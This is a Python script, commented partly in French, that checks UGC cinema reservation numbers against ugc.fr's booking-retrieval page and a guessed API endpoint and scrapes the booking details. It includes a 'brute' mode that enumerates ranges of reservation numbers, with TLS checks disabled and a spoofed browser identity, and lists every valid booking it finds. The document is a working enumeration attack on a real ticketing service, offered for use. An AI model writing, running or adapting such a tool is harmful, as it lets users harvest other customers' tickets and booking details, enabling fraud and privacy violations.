#!/usr/bin/env python3
"""
UGC e-billet checker
Vérifie la validité d'une réservation UGC
Usage: python ugc_checker.py <numero_reservation>
       python ugc_checker.py 33500063B071466134
"""

import requests, sys, re, json
from bs4 import BeautifulSoup

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "fr-FR,fr;q=0.9",
    "Referer": "https://www.ugc.fr/",
})
S.verify = False

import warnings
warnings.filterwarnings("ignore")

def check_ugc(reservation_number: str):
    reservation_number = reservation_number.strip().upper()
    print(f"\n[*] Checking UGC reservation: {reservation_number}")
    print("─" * 50)

    # Étape 1 — page principale de récupération de billet
    try:
        r = S.get("https://www.ugc.fr/reservation/retrieveBooking.html", timeout=10)
        print(f"  [GET] retrieveBooking → {r.status_code}")
    except Exception as e:
        print(f"  [!] Connection error: {e}")
        return

    # Étape 2 — POST avec le numéro de réservation
    try:
        payload = {
            "bookingNumber": reservation_number,
            "retrieveBooking": "true"
        }
        r2 = S.post(
            "https://www.ugc.fr/reservation/retrieveBooking.html",
            data=payload,
            timeout=10,
            allow_redirects=True
        )
        print(f"  [POST] retrieveBooking → {r2.status_code}")

        soup = BeautifulSoup(r2.text, "html.parser")

        # cherche les infos de réservation dans la réponse
        # UGC affiche film, date, salle, places si valide
        body = r2.text.lower()

        # indicateurs de succès
        success_indicators = [
            "votre réservation", "votre billet", "film", "séance",
            "salle", "places", "montant", "booking"
        ]
        error_indicators = [
            "introuvable", "invalid", "not found", "erreur",
            "aucune réservation", "numéro incorrect"
        ]

        found_success = any(ind in body for ind in success_indicators)
        found_error   = any(ind in body for ind in error_indicators)

        if found_error:
            print(f"\n  ❌ INVALID — réservation non trouvée")
        elif found_success:
            print(f"\n  ✅ VALID — réservation trouvée !")
            # extraire les infos
            # titre du film
            film = soup.find(class_=re.compile(r"film|movie|title", re.I))
            if film:
                print(f"  [FILM]  {film.get_text(strip=True)}")
            # date/heure
            date = soup.find(class_=re.compile(r"date|seance|session", re.I))
            if date:
                print(f"  [DATE]  {date.get_text(strip=True)}")
            # cinema
            cinema = soup.find(class_=re.compile(r"cinema|theater|lieu", re.I))
            if cinema:
                print(f"  [LIEU]  {cinema.get_text(strip=True)}")
            # dump du titre de page pour debug
            title = soup.find("title")
            if title:
                print(f"  [PAGE]  {title.get_text(strip=True)}")
        else:
            print(f"\n  [?] Réponse ambiguë — dump partiel:")
            # affiche les premiers éléments de texte significatifs
            texts = [t.strip() for t in soup.stripped_strings if len(t.strip()) > 20][:8]
            for t in texts:
                print(f"      {t}")

    except Exception as e:
        print(f"  [!] Error: {e}")

    # Étape 3 — essai API JSON si disponible
    try:
        r3 = S.get(
            f"https://www.ugc.fr/api/booking/{reservation_number}",
            headers={"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"},
            timeout=10
        )
        if r3.status_code == 200:
            try:
                d = r3.json()
                print(f"\n  [API JSON] {json.dumps(d, indent=2, ensure_ascii=False)[:500]}")
            except Exception:
                pass
        print(f"  [API] /api/booking/ → {r3.status_code}")
    except Exception:
        pass

def brute_check(prefix: str, start: int, end: int):
    """
    Brute-force une plage de numéros de réservation
    ex: brute_check("335000", 1000000, 1001000)
    """
    print(f"\n[*] Brute forcing {prefix}{start} → {prefix}{end}")
    valid = []
    for i in range(start, end):
        num = f"{prefix}{i}"
        # requête rapide HEAD pour tester
        try:
            r = S.post(
                "https://www.ugc.fr/reservation/retrieveBooking.html",
                data={"bookingNumber": num},
                timeout=5,
                allow_redirects=True
            )
            body = r.text.lower()
            if any(x in body for x in ["film","séance","salle","votre réservation"]):
                print(f"  ✅ VALID: {num}")
                valid.append(num)
            else:
                print(f"  ✗ {num}", end="\r")
        except Exception:
            pass
    print(f"\n[*] Found {len(valid)} valid reservation(s)")
    return valid

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python ugc_checker.py <reservation_number>")
        print("       python ugc_checker.py 33500063B071466134")
        print("\nBrute force mode:")
        print("       python ugc_checker.py brute <prefix> <start> <end>")
        print("       python ugc_checker.py brute 335000 1000000 1001000")
        sys.exit(1)

    if sys.argv[1].lower() == "brute":
        prefix = sys.argv[2] if len(sys.argv) > 2 else "335000"
        start  = int(sys.argv[3]) if len(sys.argv) > 3 else 1000000
        end    = int(sys.argv[4]) if len(sys.argv) > 4 else 1000100
        brute_check(prefix, start, end)
    else:
        check_ugc(sys.argv[1])
